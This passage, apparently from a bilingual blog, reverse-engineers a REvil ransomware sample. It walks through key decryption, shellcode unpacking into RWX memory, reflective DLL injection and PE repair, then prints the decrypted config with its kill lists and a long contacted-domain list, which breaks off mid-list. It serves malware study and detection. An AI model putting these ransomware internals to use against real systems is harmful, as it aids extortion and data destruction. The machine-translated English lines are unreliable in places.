a1, a2) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !sub_100019B0(dword_100BEE70, (<span class="type">char</span> *)dword_100BEE78 + dword_100BEE68, &amp;unk_100BEE6C) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)a5 = dword_100BEE78;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>其中dword_100BEE70可能會帶資料到dword_100BEE68(18行)<br>回到sub_10001000中可以更確定這裡應該就會將KEY解出<br>所以只要在sub_10001000那邊下斷點，KEY就會被解開嘞</p>
<blockquote>
<p>Where DWORD_100BEE70 may bring information to DWORD_100BEE68 (18 lines)<br>Go back to the SUB_10001000 can be more confirmed to solve the KEY<br>So as long as the SUB_10001000 is broken, Key will be unwrapped.</p>
</blockquote>
<p><img src="https://i.imgur.com/FnkN1hJ.png" alt="https://i.imgur.com/FnkN1hJ.png"></p>
<p>再來看到StartAddress中的CreateFileMappingW那段,其中的0x40就是RWX,也就是可讀可寫可執行的意思,然後再利用MapViewOfFiler建立一個空間出來</p>
<blockquote>
<p>Let’s see the CreateFilemappingw in StartAddress, where 0x40 is RWX, which is readable to be writable, and then use MapViewOffiler to create a space out.</p>
</blockquote>
<p>接下來可以看到memmove那段的dword_100BEE60它是一段shellcode然後搬去V3中(也就是MapViewOfFiler建立的一個空間中)</p>
<blockquote>
<p>Next, you can see the DWORD_100BEE60 of Memmove. It is a SHELLCODE and then moves in V3 (it is also a space established by MapViewOffiler).</p>
</blockquote>
<p>再來我們用ollydbg去實作..</p>
<blockquote>
<p>Let’s go with ollydbg to go ..</p>
</blockquote>
<p>在StartAddress那邊下斷點，也就是說我們已經知道StartAddress的位置</p>
<blockquote>
<p>In StartAddress, it is broken, that is, we already know the location of StartAddress.</p>
</blockquote>
<p><img src="https://i.imgur.com/ISWUiyI.png" alt="https://i.imgur.com/ISWUiyI.png"></p>
<p>在來去olly那下斷點(點兩下)，對100011B0這位置按右鍵後點選New origin…再來啟動程式讓他跑完後…</p>
<blockquote>
<p>After coming to olly, the breakpoint (2 times), press the right button to 100011B0, click New Origin … And then start the program and let it run…</p>
</blockquote>
<p><img src="https://i.imgur.com/ojpCTHC.png" alt="https://i.imgur.com/ojpCTHC.png"></p>
<p><img src="https://i.imgur.com/G5KBo7o.png" alt="https://i.imgur.com/G5KBo7o.png"></p>
<p>點選選項中的Debug可以看到call DLL export</p>
<p>改變Export內的選項變成ServiceMain在按call</p>
<blockquote>
<p>DEBUG in the Options option can see Call DLL EXPORT<br>Change the option in the export to become ServiceMain in Press CALL</p>
</blockquote>
<p><img src="https://i.imgur.com/9rhzl3U.png" alt="https://i.imgur.com/9rhzl3U.png"></p>
<p>正常來說它會跳回原本的100011B0，如果不下斷點，到時候無法在正確位置Debug</p>
<blockquote>
<p>Normally it will jump back to the original 100011b0, if you don’t break the breakpoint, you can’t get in the correct position.</p>
</blockquote>
<p>:::spoiler  step-over<br>The difference between [F8] step-over and [F7] step-into is that when [F8] encounters the call instruction set (function call), it will execute the call completely and return to the next instruction, while [F7] will enter the call Address continues to execute.<br>:::<br>接下來按F7走到10001110裡面</p>
<blockquote>
<p>Next, press F7 to get to 10001110</p>
</blockquote>
<p><img src="https://i.imgur.com/6xH8SMV.png" alt="https://i.imgur.com/6xH8SMV.png"></p>
<p>按F8後10001124~10001159是一個loop跑完應該就會解開KEY</p>
<blockquote>
<p>After pressing F8 10001124~10001159 is a loop, it should unlock the KEY after running</p>
</blockquote>
<p><img src="https://i.imgur.com/Q9FcT0v.png" alt="https://i.imgur.com/Q9FcT0v.png"></p>
<p>F8繼續執行到10001206那邊!</p>
<blockquote>
<p>F8 continues to be executed to 10001206</p>
</blockquote>
<p><img src="https://i.imgur.com/GeqJPht.png" alt="https://i.imgur.com/GeqJPht.png"></p>
<p>看到右下方的Arg2的記憶體大小是1FC00，可知這是一個PE(也就是說這個大小如果去除512的話會整除)</p>
<blockquote>
<p>Arg2 has a memory size of 1FC00 and is a PE(So this size is divisible if you subtract 512)</p>
</blockquote>
<p><img src="https://i.imgur.com/4ZKuvtR.png" alt="https://i.imgur.com/4ZKuvtR.png"></p>
<p>接下來在Arg3那右鍵後會看到Follow in Dump點選下去</p>
<blockquote>
<p>Next, I will see the FOLLOW IN DUMP bit after the right button.</p>
</blockquote>
<p><img src="https://i.imgur.com/9TW5SCA.png" alt="https://i.imgur.com/9TW5SCA.png"></p>
<p>Arg3、Arg4是取13h,另一個是18開頭,長度是1FC00<br>F8繼續按下去到CreatFileMappingW</p>
<blockquote>
<p>Arg3, arg4 is taken 13h, the other is 18 beginning, the length is 1FC00<br>F8 continues to press CreatFilemappingW</p>
</blockquote>
<p><img src="https://i.imgur.com/Q8EdULc.png" alt="https://i.imgur.com/Q8EdULc.png"></p>
<p>此時會申請一個RWE的空間<br>再繼續執行到MapViewFile後可以去看看EAX中存入了什麼</p>
<blockquote>
<p>At this point, an RWE space will be applied for<br>And then if I go to MapViewFile I can go and see what I put into EAX</p>
</blockquote>
<p><img src="https://i.imgur.com/I4uvqr0.png" alt="https://i.imgur.com/I4uvqr0.png"></p>
<p>這一塊的空間當有code丟入時會去執行(因為這塊空間可讀可寫可執行)</p>
<blockquote>
<p>This piece of space will be executed when there is Code to drop (because this space readable can be writable)</p>
</blockquote>
<p><img src="https://i.imgur.com/Pw5UCUh.png" alt="https://i.imgur.com/Pw5UCUh.png"></p>
<p>繼續往下執行..<br>call 1005F530..那段解出來會丟到下面的空間去執行</p>
<blockquote>
<p>Continue to execute..<br>call 1005F530..That part of the solution will be thrown down into the space to execute</p>
</blockquote>
<p><img src="https://i.imgur.com/EkisF9J.png" alt="https://i.imgur.com/EkisF9J.png"></p>
<p>總結就是那段dll中有包一個shellcode,而且那段shellcode被加密,如果它被解開會被丟到那個空間中</p>
<blockquote>
<p>The summary is that there is a package of shellcode in that DLL, and that shellcode is encrypted, and if it is unlocked, it will be thrown into that space</p>
</blockquote>
<p><img src="https://i.imgur.com/NpVPN2X.png" alt="https://i.imgur.com/NpVPN2X.png"></p>
<p>這段的code其實就是replay dll injection,前面會把dll載起來,在HEX的後面一點會有一段PE</p>
<blockquote>
<p>This code is actually the Replay DLL INJECTION, which will put the DLL in front, and there will be a PE at the back of HEX.</p>
</blockquote>
<p>接下來繼續步進下去會跳到100010E0中執行那個位置<br>解開是shellcode去幫她解開,他把這段code執行到某個地方,它就會把它給解開了</p>
<blockquote>
<p>The next step will jump to 100010E0 to perform that position</p>
<p>Shellcode undoes it for her, and when shellCode executes that code somewhere, it undoes it</p>
</blockquote>
<p>然後code執行到10001104中,裡面的code執行到某個地方就會解開</p>
<blockquote>
<p>And then the code executes into 10001104, and the code inside executes somewhere and unlocks</p>
</blockquote>
<p><img src="https://i.imgur.com/zaV9Mku.png" alt="https://i.imgur.com/zaV9Mku.png"></p>
<p>這裡就隨便設置一個斷點</p>
<blockquote>
<p>just going to set a breakpoint</p>
</blockquote>
<p><img src="https://i.imgur.com/RfnEZCa.png" alt="https://i.imgur.com/RfnEZCa.png"></p>
<p>因為現在下面還看不到PE,所以我們先繼續讓他往下跑(F8)<br>可以猜測解密的應該是在00A80101那段,所以F7可以進去看看它程式,如果F8跳過去後,dll就會被執行了(REvil啟動)</p>
<blockquote>
<p>Since you can’t see PE down here, let’s just keep it running down (F8).</p>
<p>If F8 jumps, the DLL will be executed (REvil starts).</p>
</blockquote>
<p><img src="https://i.imgur.com/53i9I9J.png" alt="https://i.imgur.com/53i9I9J.png"></p>
<p>加密畫面…</p>
<blockquote>
<p>Encrypting screen …</p>
</blockquote>
<p><img src="https://i.imgur.com/LLC8ufy.png" alt="https://i.imgur.com/LLC8ufy.png"></p>
<p>轉到winhex可以看到…<br>剛剛我們在記憶體中dump下來的檔案(00A80101的空間),接下來可以修PE</p>
<blockquote>
<p>Go to Winhex and you can see…</p>
<p>We just dumped the file in memory (00A80101 space), next we can repair PE</p>
</blockquote>
<p><img src="https://i.imgur.com/7vu4Fuh.png" alt="https://i.imgur.com/7vu4Fuh.png"></p>
<p>可以知道的是PE它的開頭是MZ結尾是90</p>
<blockquote>
<p>What we know is that PE begins with MZ and ends with 90</p>
</blockquote>
<p><img src="https://i.imgur.com/vhxbqbE.png" alt="https://i.imgur.com/vhxbqbE.png"></p>
<p>730的地方會指向PE</p>
<blockquote>
<p>730 will point to PE</p>
</blockquote>
<p>再來把檔案改一下,讓它看起來感覺像PE</p>
<blockquote>
<p>Let’s change the file again to make it look and feel like PE</p>
</blockquote>
<p><img src="https://i.imgur.com/dBefVhN.png" alt="https://i.imgur.com/dBefVhN.png"></p>
<p>不過那些session名稱都被塗掉了(不然應該要有.text、.data..)</p>
<blockquote>
<p>But those session names have been blacked out (.text,.data..).</p>
</blockquote>
<p><img src="https://i.imgur.com/CaFSKxY.png" alt="https://i.imgur.com/CaFSKxY.png"></p>
<p>然後code通常都會從400H開始,因為要對齊512..</p>
<blockquote>
<p>Then code will usually start at 400H because of the 512..</p>
</blockquote>
<p><img src="https://i.imgur.com/ii64Jqo.png" alt="https://i.imgur.com/ii64Jqo.png"></p>
<p>這個地方解開後就可以丟IDA<br>而剛剛所看到的就是勒索它的主體</p>
<blockquote>
<p>Once this place is unlocked, IDA can be lost</p>
<p>And what you’ve just seen is the subject of blackmail</p>
</blockquote>
<p>可以知道的是加密它是遞增的EX:0123456…FF再循環這樣子</p>
<blockquote>
<p>What you can know is that encryption is incremental EX:0123456…FF recirculation looks like this</p>
<p><img src="https://i.imgur.com/4gXaysq.png" alt="https://i.imgur.com/4gXaysq.png"></p>
</blockquote>
<p>把那段加密的PE檔拿去CyberChef</p>
<blockquote>
<p>Take the encrypted PE file to Cyberchef</p>
</blockquote>
<p><img src="https://i.imgur.com/QkBF4d1.png" alt="https://i.imgur.com/QkBF4d1.png"></p>
<p>這裡解開就是PE它的config</p>
<blockquote>
<p>Unwrap here is the config of PE</p>
</blockquote>
<p><img src="https://i.imgur.com/dhRY3vR.png" alt="https://i.imgur.com/dhRY3vR.png"></p>
<p>裡面的訊息可能有這PE連網後會做的事情或是建立資料夾…這些資料都被存在其中</p>
<blockquote>
<p>Inside the message may have the PE after the network will do things or create a folder…All of this data is in there</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;pk&quot;: &quot;9/AgyLvWEviWbvuayR2k0Q140e9LZJ5hwrmto/zCyFM=&quot;,</span><br><span class="line">    &quot;pid&quot;: &quot;$2a$12$prOX/4eKl8zrpGSC5lnHPecevs5NOckOUW5r3s4JJYDnZZSghvBkq&quot;,</span><br><span class="line">    &quot;sub&quot;: &quot;8254&quot;,</span><br><span class="line">    &quot;dbg&quot;: false,</span><br><span class="line">    &quot;et&quot;: 0,</span><br><span class="line">    &quot;wipe&quot;: true,</span><br><span class="line">    &quot;wht&quot;: &#123;</span><br><span class="line">        &quot;fld&quot;: [</span><br><span class="line">            &quot;program files&quot;,</span><br><span class="line">            &quot;appdata&quot;,</span><br><span class="line">            &quot;mozilla&quot;,</span><br><span class="line">            &quot;$windows.~ws&quot;,</span><br><span class="line">            &quot;application data&quot;,</span><br><span class="line">            &quot;$windows.~bt&quot;,</span><br><span class="line">            &quot;google&quot;,</span><br><span class="line">            &quot;$recycle.bin&quot;,</span><br><span class="line">            &quot;windows.old&quot;,</span><br><span class="line">            &quot;programdata&quot;,</span><br><span class="line">            &quot;system volume information&quot;,</span><br><span class="line">            &quot;program files (x86)&quot;,</span><br><span class="line">            &quot;boot&quot;,</span><br><span class="line">            &quot;tor browser&quot;,</span><br><span class="line">            &quot;windows&quot;,</span><br><span class="line">            &quot;intel&quot;,</span><br><span class="line">            &quot;perflogs&quot;,</span><br><span class="line">            &quot;msocache&quot;</span><br><span class="line">        ],</span><br><span class="line">        &quot;fls&quot;: [</span><br><span class="line">            &quot;ntldr&quot;,</span><br><span class="line">            &quot;thumbs.db&quot;,</span><br><span class="line">            &quot;bootsect.bak&quot;,</span><br><span class="line">            &quot;autorun.inf&quot;,</span><br><span class="line">            &quot;ntuser.dat.log&quot;,</span><br><span class="line">            &quot;boot.ini&quot;,</span><br><span class="line">            &quot;iconcache.db&quot;,</span><br><span class="line">            &quot;bootfont.bin&quot;,</span><br><span class="line">            &quot;ntuser.dat&quot;,</span><br><span class="line">            &quot;ntuser.ini&quot;,</span><br><span class="line">            &quot;desktop.ini&quot;</span><br><span class="line">        ],</span><br><span class="line">        &quot;ext&quot;: [</span><br><span class="line">            &quot;ps1&quot;,</span><br><span class="line">            &quot;ldf&quot;,</span><br><span class="line">            &quot;lock&quot;,</span><br><span class="line">            &quot;theme&quot;,</span><br><span class="line">            &quot;msi&quot;,</span><br><span class="line">            &quot;sys&quot;,</span><br><span class="line">            &quot;wpx&quot;,</span><br><span class="line">            &quot;cpl&quot;,</span><br><span class="line">            &quot;adv&quot;,</span><br><span class="line">            &quot;msc&quot;,</span><br><span class="line">            &quot;scr&quot;,</span><br><span class="line">            &quot;bat&quot;,</span><br><span class="line">            &quot;key&quot;,</span><br><span class="line">            &quot;ico&quot;,</span><br><span class="line">            &quot;dll&quot;,</span><br><span class="line">            &quot;hta&quot;,</span><br><span class="line">            &quot;deskthemepack&quot;,</span><br><span class="line">            &quot;nomedia&quot;,</span><br><span class="line">            &quot;msu&quot;,</span><br><span class="line">            &quot;rtp&quot;,</span><br><span class="line">            &quot;msp&quot;,</span><br><span class="line">            &quot;idx&quot;,</span><br><span class="line">            &quot;ani&quot;,</span><br><span class="line">            &quot;386&quot;,</span><br><span class="line">            &quot;diagcfg&quot;,</span><br><span class="line">            &quot;bin&quot;,</span><br><span class="line">            &quot;mod&quot;,</span><br><span class="line">            &quot;ics&quot;,</span><br><span class="line">            &quot;com&quot;,</span><br><span class="line">            &quot;hlp&quot;,</span><br><span class="line">            &quot;spl&quot;,</span><br><span class="line">            &quot;nls&quot;,</span><br><span class="line">            &quot;cab&quot;,</span><br><span class="line">            &quot;exe&quot;,</span><br><span class="line">            &quot;diagpkg&quot;,</span><br><span class="line">            &quot;icl&quot;,</span><br><span class="line">            &quot;ocx&quot;,</span><br><span class="line">            &quot;rom&quot;,</span><br><span class="line">            &quot;prf&quot;,</span><br><span class="line">            &quot;themepack&quot;,</span><br><span class="line">            &quot;msstyles&quot;,</span><br><span class="line">            &quot;lnk&quot;,</span><br><span class="line">            &quot;icns&quot;,</span><br><span class="line">            &quot;mpa&quot;,</span><br><span class="line">            &quot;drv&quot;,</span><br><span class="line">            &quot;cur&quot;,</span><br><span class="line">            &quot;diagcab&quot;,</span><br><span class="line">            &quot;cmd&quot;,</span><br><span class="line">            &quot;shs&quot;</span><br><span class="line">        ]</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;wfld&quot;: [</span><br><span class="line">        &quot;backup&quot;</span><br><span class="line">    ],</span><br><span class="line">    &quot;prc&quot;: [</span><br><span class="line">        &quot;encsvc&quot;,</span><br><span class="line">        &quot;powerpnt&quot;,</span><br><span class="line">        &quot;ocssd&quot;,</span><br><span class="line">        &quot;steam&quot;,</span><br><span class="line">        &quot;isqlplussvc&quot;,</span><br><span class="line">        &quot;outlook&quot;,</span><br><span class="line">        &quot;sql&quot;,</span><br><span class="line">        &quot;ocomm&quot;,</span><br><span class="line">        &quot;agntsvc&quot;,</span><br><span class="line">        &quot;mspub&quot;,</span><br><span class="line">        &quot;onenote&quot;,</span><br><span class="line">        &quot;winword&quot;,</span><br><span class="line">        &quot;thebat&quot;,</span><br><span class="line">        &quot;excel&quot;,</span><br><span class="line">        &quot;mydesktopqos&quot;,</span><br><span class="line">        &quot;ocautoupds&quot;,</span><br><span class="line">        &quot;thunderbird&quot;,</span><br><span class="line">        &quot;synctime&quot;,</span><br><span class="line">        &quot;infopath&quot;,</span><br><span class="line">        &quot;mydesktopservice&quot;,</span><br><span class="line">        &quot;firefox&quot;,</span><br><span class="line">        &quot;oracle&quot;,</span><br><span class="line">        &quot;sqbcoreservice&quot;,</span><br><span class="line">        &quot;dbeng50&quot;,</span><br><span class="line">        &quot;tbirdconfig&quot;,</span><br><span class="line">        &quot;msaccess&quot;,</span><br><span class="line">        &quot;visio&quot;,</span><br><span class="line">        &quot;dbsnmp&quot;,</span><br><span class="line">        &quot;wordpad&quot;,</span><br><span class="line">        &quot;xfssvccon&quot;</span><br><span class="line">    ],</span><br><span class="line">    &quot;dmn&quot;: &quot;boisehosting.net;fotoideaymedia.es;dubnew.com;stallbyggen.se;koken-voor-baby.nl;juneauopioidworkgroup.org;vancouver-print.ca;zewatchers.com;bouquet-de-roses.com;seevilla-dr-sturm.at;olejack.ru;i-trust.dk;wasmachtmeinfonds.at;appsformacpc.com;friendsandbrgrs.com;thenewrejuveme.com;xn--singlebrsen-vergleich-nec.com;sabel-bf.com;seminoc.com;ceres.org.au;cursoporcelanatoliquido.online;marietteaernoudts.nl;tastewilliamsburg.com;charlottepoudroux-photographie.fr;aselbermachen.com;klimt2012.info;accountancywijchen.nl;creamery201.com;rerekatu.com;makeurvoiceheard.com;vannesteconstruct.be;wellplast.se;andersongilmour.co.uk;bradynursery.com;aarvorg.com;facettenreich27.de;balticdermatology.lt;artige.com;highlinesouthasc.com;crowd-patch.co.uk;sofavietxinh.com;jorgobe.at;danskretursystem.dk;higadograsoweb.com;supportsumba.nl;ruralarcoiris.com;projetlyonturin.fr;kidbucketlist.com.au;harpershologram.wordpress.com;ohidesign.com;international-sound-awards.com;krlosdavid.com;durganews.com;leather-factory.co.jp;coding-machine.com;i-arslan.de;caribbeansunpoker.com;mir-na-iznanku.com;ki-lowroermond.nl;promesapuertorico.com;kissit.ca;dezatec.es;cite4me.org;grelot-home.com;musictreehouse.net;hkr-reise.de;id-vet.com;gasolspecialisten.se;vyhino-zhulebino-24.ru;karacaoglu.nl;bayoga.co.uk;solhaug.tk;jadwalbolanet.info;ncid.bc.ca;bricotienda.com;boldcitydowntown.com;homecomingstudio.com;sojamindbody.com;castillobalduz.es;asgestion.com;dushka.ua;hiddencitysecrets.com.au;danubecloud.com;roadwarrior.app;newstap.com.ng;no-plans.com;schoolofpassivewealth.com;senson.fi;denifl-consulting.at;lmtprovisions.com;talentwunder.com;acomprarseguidores.com;myzk.site;theapifactory.com;midmohandyman.com;argos.wityu.fund;dinslips.se;kalkulator-oszczednosci.pl;wurmpower.at;drugdevice.org;foretprivee.ca;nurturingwisdom.com;funjose.org.gt;blgr.be;readberserk.com;lescomtesdemean.be;firstpaymentservices.com;malychanieruchomoscipremium.com;travelffeine.com;latribuessentielle.com;lusak.at;better.town;smessier.com;kafu.ch;ikads.org;id-et-d.fr;sanaia.com;prochain-voyage.net;edrcreditservices.nl;yassir.pro;gantungankunciakrilikbandung.com;moveonnews.com;bhwlawfirm.com;bigbaguettes.eu;edv-live.de;littlebird.salon;iyengaryogacharlotte.com;toponlinecasinosuk.co.uk;zonamovie21.net;caribdoctor.org;body-guards.it;calabasasdigest.com;elimchan.com;herbstfeststaefa.ch;thewellnessmimi.com;corola.es;pomodori-pizzeria.de;controldekk.com;lichencafe.com;lefumetdesdombes.com;seagatesthreecharters.com;copystar.co.uk;systemate.dk;alsace-first.com;webmaster-peloton.com;koko-nora.dk;jakekozmor.com;mousepad-direkt.de;iwelt.de;dirittosanitario.biz;precisionbevel.com;boulderwelt-muenchen-west.de;chatizel-paysage.fr;praxis-foerderdiagnostik.de;globedivers.wordpress.com;nosuchthingasgovernment.com;neuschelectrical.co.za;schmalhorst.de;mediaclan.info;ihr-news.jp;bunburyfreightservices.com.au;edelman.jp;backstreetpub.com;spsshomeworkhelp.com;lillegrandpalais.com;smithmediastrategies.com;enovos.de;loprus.pl;bsaship.com;importardechina.info;shhealthlaw.com;freie-baugutachterpraxis.de;maxadams.london;deprobatehelp.com;baylegacy.com;deltacleta.cat;financescorecard.com;maureenbreezedancetheater.org;plv.media;winrace.no;leoben.at;pawsuppetlovers.com;tuuliautio.fi;paradicepacks.com;1team.es;testcoreprohealthuk.com;broseller.com;iyahayki.nl;lorenacarnero.com;satyayoga.de;notmissingout.com;chavesdoareeiro.com;mezhdu-delom.ru;hugoversichert.de;jusibe.com;imaginado.de;craftleathermnl.com;sauschneider.info;atalent.fi;conexa4papers.trade;global-kids.info;serce.info.pl;agence-referencement-naturel-geneve.net;zimmerei-fl.de;augenta.com;fannmedias.com;villa-marrakesch.de;ulyssemarketing.com;x-ray.ca;schraven.de;bowengroup.com.au;sairaku.net;southeasternacademyofprosthodontics.org;modamilyon.com;pubweb.carnet.hr;alysonhoward.com;sahalstore.com;triactis.com;panelsandwichmadrid.es;xn--vrftet-pua.biz;adoptioperheet.fi;miriamgrimm.de;filmstreamingvfcomplet.be;kostenlose-webcams.com;deoudedorpskernnoordwijk.nl;live-your-life.jp;mardenherefordshire-pc.gov.uk;instatron.net;mirjamholleman.nl;euro-trend.pl;kojima-shihou.com;nuzech.com;basisschooldezonnewijzer.nl;quemargrasa.net;actecfoundation.org;gamesboard.info;podsosnami.ru;extensionmaison.info;retroearthstudio.com;polzine.net;hmsdanmark.dk;linnankellari.fi;schoellhammer.com;elpa.se;mooreslawngarden.com;rozemondcoaching.nl;lenreactiv-shop.ru;uranus.nl;advokathuset.dk;ora-it.de;love30-chanko.com;smartypractice.com;rebeccarisher.com;cafemattmeera.com;bargningavesta.se;www1.proresult.no;rhinosfootballacademy.com;polychromelabs.com;notsilentmd.org;makeflowers.ru;zimmerei-deboer.de;ccpbroadband.com;iwr.nl;wychowanieprzedszkolne.pl;greenpark.ch;bimnapratica.com;lachofikschiet.nl;memaag.com;parking.netgateway.eu;tanzschule-kieber.de;antiaginghealthbenefits.com;simulatebrain.com;digi-talents.com;hairnetty.wordpress.com;samnewbyjax.com;helikoptervluchtnewyork.nl;devlaur.com;cimanchesterescorts.co.uk;houseofplus.com;rushhourappliances.com;pelorus.group;kedak.de;lapmangfpt.info.vn;pivoineetc.fr;marchand-sloboda.com;anybookreader.de;markelbroch.com;celularity.com;rafaut.com;unim.su;latestmodsapks.com;thedresserie.com;bigasgrup.com;slimidealherbal.com;phantastyk.com;thailandholic.com;tophumanservicescourses.com;aakritpatel.com;navyfederalautooverseas.com;wien-mitte.co.at;forestlakeuca.org.au;sporthamper.com;psnacademy.in;michaelsmeriglioracing.com;jbbjw.com;colorofhorses.com;iqbalscientific.com;cleliaekiko.online;stemplusacademy.com;effortlesspromo.com;microcirc.net;mbfagency.com;theduke.de;drinkseed.com;troegs.com;peterstrobos.com;consultaractadenacimiento.com;huissier-creteil.com;geoffreymeuli.com;skanah.com;despedidascostablanca.es;alten-mebel63.ru;theadventureedge.com;profectis.de;mepavex.nl;rimborsobancario.net;pasvenska.se;tampaallen.com;symphonyenvironmental.com;videomarketing.pro;pickanose.com;licor43.de;aniblinova.wordpress.com;ventti.com.ar;hhcourier.com;buymedical.biz;oncarrot.com;nachhilfe-unterricht.com;mapawood.com;vox-surveys.com;milsing.hr;sotsioloogia.ee;nativeformulas.com;kirkepartner.dk;partnertaxi.sk;visiativ-industry.fr;transliminaltribe.wordpress.com;chefdays.de;cursosgratuitosnainternet.com;faronics.com;d2marketing.co.uk;lapinlviasennus.fi;miraclediet.fun;bristolaeroclub.co.uk;jameskibbie.com;songunceliptv.com;baronloan.org;idemblogs.com;eglectonk.online;christinarebuffetcourses.com;bastutunnan.se;blogdecachorros.com;finde-deine-marke.de;platformier.com;antenanavi.com;vanswigchemdesign.com;gporf.fr;pmc-services.de;atmos-show.com;danholzmann.com;itelagen.com;transportesycementoshidalgo.es;gymnasedumanagement.com;siluet-decor.ru;gasbarre.com;milltimber.aberdeen.sch.uk;tinkoff-mobayl.ru;expandet.dk;rumahminangberdaya.com;polymedia.dk;newyou.at;zenderthelender.com;artallnightdc.com;tomaso.gr;centrospgolega.com;sweering.fr;tux-espacios.com;ecopro-kanto.com;spacecitysisters.org;bierensgebakkramen.nl;all-turtles.com;coffreo.biz;tandartspraktijkheesch.nl;vietlawconsultancy.com;deko4you.at;tennisclubetten.nl;extraordinaryoutdoors.com;crowcanyon.com;classycurtainsltd.co.uk;apolomarcas.com;verytycs.com;manijaipur.com;veybachcenter.de;falcou.fr;associationanalytics.com;beautychance.se;pocket-opera.de;christ-michael.net;vdberg-autoimport.nl;4net.guru;finediningweek.pl;stampagrafica.es;naturalrapids.com;ussmontanacommittee.us;beaconhealthsystem.org;upplandsspar.se;tradiematepro.com.au;oneplusresource.org;maasreusel.nl;aodaichandung.com;campus2day.de;burkert-ideenreich.de;you-bysia.com.au;mediaacademy-iraq.org;xtptrack.com;eaglemeetstiger.de;mountaintoptinyhomes.com;stemenstilte.nl;noskierrenteria.com;ivfminiua.com;biapi-coaching.fr;art2gointerieurprojecten.nl;corendonhotels.com;ditog.fr;kadesignandbuild.co.uk;abogadosaccidentetraficosevilla.es;camsadviser.com;limassoldriving.com;worldhealthbasicinfo.com;kojinsaisei.info;schmalhorst.de;bigler-hrconsulting.ch;girlillamarketing.com;xn--rumung-bua.online;naturstein-hotte.de;agence-chocolat-noir.com;stormwall.se;collaborativeclassroom.org;baptisttabernacle.com;streamerzradio1.site;mooglee.com;smart-light.co.uk;fitovitaforum.com;c2e-poitiers.com;igrealestate.com;wari.com.pe;takeflat.com;logopaedie-blomberg.de;mrsplans.net;mooshine.com;humanityplus.org;otsu-bon.com;onlyresultsmarketing.com;interactcenter.org;ungsvenskarna.se;35-40konkatsu.net;zzyjtsgls.com;spectrmash.ru;tenacitytenfold.com;torgbodenbollnas.se;drnice.de;lightair.com;huesges-gruppe.de;promalaga.es;paulisdogshop.de;hotelsolbh.com.br;julis-lsa.de;myteamgenius.com;darnallwellbeing.org.uk;refluxreducer.com;educar.org;kuntokeskusrok.fi;truenyc.co;comparatif-lave-linge.fr;frontierweldingllc.com;autodemontagenijmegen.nl;spylista.com;allfortheloveofyou.com;ilso.net;corona-handles.com;micahkoleoso.de;fairfriends18.de;haremnick.com;ecoledansemulhouse.fr;blewback.com;macabaneaupaysflechois.com;osterberg.fi;surespark.org.uk;stupbratt.no;hokagestore.com;mirkoreisser.de;tomoiyuma.com;tigsltd.com;manifestinglab.com;glennroberts.co.nz;hardinggroup.com;zso-mannheim.de;yousay.site;dublikator.com;oneheartwarriors.at;pointos.com;kenhnoithatgo.com;ausbeverage.com.au;testzandbakmetmening.online;grupocarvalhoerodrigues.com.br;werkkring.nl;hotelzentral.at;vibethink.net;123vrachi.ru;allure-cosmetics.at;mrxermon.de;bloggyboulga.net;bouldercafe-wuppertal.de;sobreholanda.com;smogathon.com;beyondmarcomdotcom.wordpress.com;wraithco.com;bookspeopleplaces.com;montrium.com;webcodingstudio.com;lucidinvestbank.com;ncs-graphic-studio.com;stingraybeach.com;aglend.com.au;lecantou-coworking.com;tongdaifpthaiphong.net;solerluethi-allart.ch;coursio.com;otto-bollmann.de;madinblack.com;vibehouse.rw;bridgeloanslenders.com;erstatningsadvokaterne.dk;resortmtn.com;socstrp.org;pier40forall.org;ostheimer.at;quickyfunds.com;aminaboutique247.com;jobcenterkenya.com;jenniferandersonwriter.com;marcuswhitten.site;mediaplayertest.net;irinaverwer.com;stoeberstuuv.de;lebellevue.fr;the-virtualizer.com;outcomeisincome.com;gonzalezfornes.es;kunze-immobilien.de;myhealth.net.au;helenekowalsky.com;xn--fn-kka.no;withahmed.com;simplyblessedbykeepingitreal.com;havecamerawilltravel2017.wordpress.com;muamuadolls.com;balticdentists.com;mank.de;croftprecision.co.uk;jandaonline.com;datacenters-in-europe.com;gw2guilds.org;raschlosser.de;geekwork.pl;pv-design.de;opatrovanie-ako.sk;ausair.com.au;commonground-stories.com;parebrise-tla.fr;vloeren-nu.nl;conasmanagement.de;dlc.berlin;liveottelut.com;4youbeautysalon.com;lykkeliv.net;adultgamezone.com;hexcreatives.co;citymax-cr.com;portoesdofarrobo.com;patrickfoundation.net;tonelektro.nl;atozdistribution.co.uk;urclan.net;evergreen-fishing.com;body-armour.online;nsec.se;autopfand24.de;syndikat-asphaltfieber.de;yourobgyn.net;vihannesporssi.fi;new.devon.gov.uk;teczowadolina.bytom.pl;antonmack.de;dpo-as-a-service.com;pogypneu.sk;creative-waves.co.uk;htchorst.nl;xn--fnsterputssollentuna-39b.se;norpol-yachting.com;parkstreetauto.net;sloverse.com;candyhouseusa.com;tsklogistik.eu;smejump.co.th;diversiapsicologia.es;unetica.fr;drfoyle.com;cranleighscoutgroup.org;dekkinngay.com;n1-headache.com;amerikansktgodis.se;evangelische-pfarrgemeinde-tuniberg.de;fransespiegels.nl;coastalbridgeadvisors.com;qualitaetstag.de;kath-kirche-gera.de;alhashem.net;schutting-info.nl;2ekeus.nl;berlin-bamboo-bikes.org;minipara.com;blood-sports.net;milestoneshows.com;physiofischer.de;ontrailsandboulevards.com;babcockchurch.org;healthyyworkout.com;plantag.de;krcove-zily.eu;mylolis.com;fax-payday-loans.com;praxis-management-plus.de;smokeysstoves.com;longislandelderlaw.com;calxplus.eu;mountsoul.de;dubscollective.com;luckypatcher-apkz.com;epwritescom.wordpress.com;fundaciongregal.org;klusbeter.nl;jobmap.at;oldschoolfun.net;abl1.net;labobit.it;romeguidedvisit.com;carrybrands.nl;people-biz.com;blossombeyond50.com;theclubms.com;whittier5k.com;jolly-events.com;kisplanning.com.au;rostoncastings.co.uk;ravensnesthomegoods.com;nhadatcanho247.com;vetapharma.fr;hihaho.com;tulsawaterheaterinstallation.com;purposeadvisorsolutions.com;faizanullah.com;directwindowco.com;herbayupro.com;pay4essays.net;work2live.de;stoneys.ch;webhostingsrbija.rs;lange.host;baustb.de;psa-sec.de;hushavefritid.dk;l